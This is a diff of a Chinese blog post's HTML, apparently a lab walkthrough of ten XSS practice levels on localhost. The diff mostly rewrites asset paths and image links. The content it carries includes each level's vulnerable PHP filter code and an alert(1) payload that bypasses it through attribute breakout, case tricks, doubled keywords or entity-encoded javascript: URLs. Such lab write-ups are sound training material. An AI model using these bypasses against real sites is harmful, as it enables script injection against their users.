@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/fluid.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../../img/fluid.png">
+  <link rel="icon" href="../../../../../img/fluid.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -25,10 +25,10 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://idea-oss.github.io/img/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.png">
 <meta property="article:published_time" content="2022-06-14T17:14:53.000Z">
-<meta property="article:modified_time" content="2022-06-14T17:39:28.270Z">
+<meta property="article:modified_time" content="2024-01-07T09:34:30.930Z">
 <meta property="article:author" content="iDea">
-<meta property="article:tag" content="xss靶场练习">
 <meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="xss靶场练习">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://idea-oss.github.io/img/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.png">
   
@@ -58,12 +58,12 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
 
 
-<link  rel="stylesheet" href="/css/main.css" />
+<link  rel="stylesheet" href="../../../../../css/main.css" />
 
 
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  <link id="highlight-css" rel="stylesheet" href="../../../../../css/highlight.css" />
   
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../../css/highlight-dark.css" />
   
 
 
@@ -79,8 +79,8 @@
       Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <script  src="../../../../../js/utils.js" ></script>
+  <script  src="../../../../../js/color-schema.js" ></script>
 
   
 <meta name="generator" content="Hexo 6.2.0"></head>
@@ -95,7 +95,7 @@
 <div class="header-inner" style="height: 85vh;">
   <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">
+    <a class="navbar-brand" href="../../../../../index.html">
       <strong>iDea</strong>
     </a>
 
@@ -114,7 +114,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/">
+              <a class="nav-link" href="../../../../../index.html">
                 <i class="iconfont icon-home-fill"></i>
                 首页
               </a>
@@ -126,7 +126,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/archives/">
+              <a class="nav-link" href="../../../../../archives/">
                 <i class="iconfont icon-archive-fill"></i>
                 归档
               </a>
@@ -138,7 +138,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/categories/">
+              <a class="nav-link" href="../../../../../categories/">
                 <i class="iconfont icon-category-fill"></i>
                 分类
               </a>
@@ -150,7 +150,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/tags/">
+              <a class="nav-link" href="../../../../../tags/">
                 <i class="iconfont icon-tags-fill"></i>
                 标签
               </a>
@@ -162,7 +162,7 @@
           
           
             <li class="nav-item">
-              <a class="nav-link" href="/about/">
+              <a class="nav-link" href="../../../../../about/">
                 <i class="iconfont icon-user-fill"></i>
                 关于
               </a>
@@ -191,7 +191,7 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/./img/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.png') no-repeat center center; background-size: cover;">
+     style="background: url('../../../../.././img/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
       <div class="banner-text text-center fade-in-up">
@@ -279,55 +279,55 @@
               
               <p><strong>- Pass-1</strong></p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/xss/level1.php?name=&lt;script&gt;<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/1f8db8aa925a4080bf0d8fb0ae1db8c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>通过<br><strong>- Pass-2</strong><br>直接插入不行，引号将其包裹起了<br><img src="https://img-blog.csdnimg.cn/ed782acfbb184dc7a21481d7ea0e0e46.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107172935992.png" srcset="/img/loading.gif" lazyload alt="image-20240107172935992"><br>通过<br><strong>- Pass-2</strong><br>直接插入不行，引号将其包裹起了<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107172948140.png" srcset="/img/loading.gif" lazyload alt="image-20240107172948140"></p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">http:<span class="hljs-comment">//127.0.0.1/xss/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;--</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/860786c3a44e4e63a264ee118f1f8c36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-3</strong><br>审查元素看看<br><img src="https://img-blog.csdnimg.cn/aa00ae981b8445ed9b2547212cc4870a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>看似和2没啥区别 但与level2不同的是，value做了校验，双引号和尖括号都被校验了<br>可以集合单引号和事件来触发</p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107172959302.png" srcset="/img/loading.gif" lazyload alt="image-20240107172959302"><br><strong>- Pass-3</strong><br>审查元素看看<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173037882.png" srcset="/img/loading.gif" lazyload alt="image-20240107173037882"><br>看似和2没啥区别 但与level2不同的是，value做了校验，双引号和尖括号都被校验了<br>可以集合单引号和事件来触发</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">‘ onclick=<span class="hljs-string">&#x27;alert(1)</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/93bd7072e7e345baa164cdd6a95d13fe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p><strong>- Pass-4</strong><br><img src="https://img-blog.csdnimg.cn/b0b677dd1e9942c59e9a9c2375b61d40.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>可以看到对&lt; &gt;进行了过滤<br>由下图可以看出是双引号包裹得<br><img src="https://img-blog.csdnimg.cn/4b271fbaba1d476f827d704a359afd3c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173047186.png" srcset="/img/loading.gif" lazyload alt="image-20240107173047186"></p>
+<p><strong>- Pass-4</strong><br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173055574.png" srcset="/img/loading.gif" lazyload alt="image-20240107173055574"><br>可以看到对&lt; &gt;进行了过滤<br>由下图可以看出是双引号包裹得<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173103900.png" srcset="/img/loading.gif" lazyload alt="image-20240107173103900"></p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/11cce687faa54f9598dea121e846d1dc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-5</strong><br><img src="https://img-blog.csdnimg.cn/e1f2a65dcaf24c0e8b68d1158d7fec54.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>对script进行了过滤<br>看了下还是双引号包裹<br><img src="https://img-blog.csdnimg.cn/594cdb06b0ee4512a4c6727032c24389.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload><br>过滤了</p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173112017.png" srcset="/img/loading.gif" lazyload alt="image-20240107173112017"><br><strong>- Pass-5</strong><br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173123212.png" srcset="/img/loading.gif" lazyload alt="image-20240107173123212"><br>对script进行了过滤<br>看了下还是双引号包裹<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173132175.png" srcset="/img/loading.gif" lazyload alt="image-20240107173132175"><br>过滤了</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/d3bc3678eb1343d2b3bae1010789cba4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>看手源码<br><img src="https://img-blog.csdnimg.cn/16bc20b21ddb418cbf3a8805f97d8d49.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173141766.png" srcset="/img/loading.gif" lazyload alt="image-20240107173141766"><br>看手源码<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173149776.png" srcset="/img/loading.gif" lazyload alt="image-20240107173149776"></p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;  </span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2d1c3438c1414aed9ef8a8dd3e78b31f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-6</strong><br>过滤</p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173201068.png" srcset="/img/loading.gif" lazyload alt="image-20240107173201068"><br><strong>- Pass-6</strong><br>过滤</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>];<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br></code></pre></td></tr></table></figure>
 <p>可大小写绕过</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;Script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/98191544e8c347538a55c5d238d3bbf1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-7</strong></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173213918.png" srcset="/img/loading.gif" lazyload alt="image-20240107173213918"><br><strong>- Pass-7</strong></p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str =<span class="hljs-built_in">strtolower</span>( $_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str5);<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/8ab3b7d236bc440f8a4201bcb15a4a40.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-8</strong></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173223378.png" srcset="/img/loading.gif" lazyload alt="image-20240107173223378"><br><strong>- Pass-8</strong></p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br>$str7=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,$str6);<br></code></pre></td></tr></table></figure>
 <p>绕过</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>) <br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/c51c6a21c5864a8a874cd843d5b7d8da.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-9</strong></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173251577.png" srcset="/img/loading.gif" lazyload alt="image-20240107173251577"><br><strong>- Pass-9</strong></p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br>$str7=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,$str6);<br>echo <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str)<span class="hljs-number">.&#x27;</span><span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;</span>您的链接不合法？有没有！<span class="hljs-string">&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">else</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;</span><span class="hljs-string">&#x27;.$str7.&#x27;</span><span class="hljs-string">&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="hljs-string">&lt;?php </span><br><span class="hljs-string">echo &quot;</span>&lt;h3 align=center&gt;payload的长度:<span class="hljs-string">&quot;.strlen($str7).&quot;</span>&lt;/h3&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">java&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/176725823c924c408925522c0142e34c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-10</strong></p>
+<p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173303276.png" srcset="/img/loading.gif" lazyload alt="image-20240107173303276"><br><strong>- Pass-10</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br>&lt;?php <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.strlen(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure>
 <p>从代码中可以看到是有几个隐藏参数的如下构造</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/xss/level10.php?name=1&amp;keyword=1&amp;t_sort=%22type=%22text%22%20onclick=%22alert(1)<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/bd82752d29a44cddab5dd9ad4de761d6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><strong>- Pass-11</strong></p>
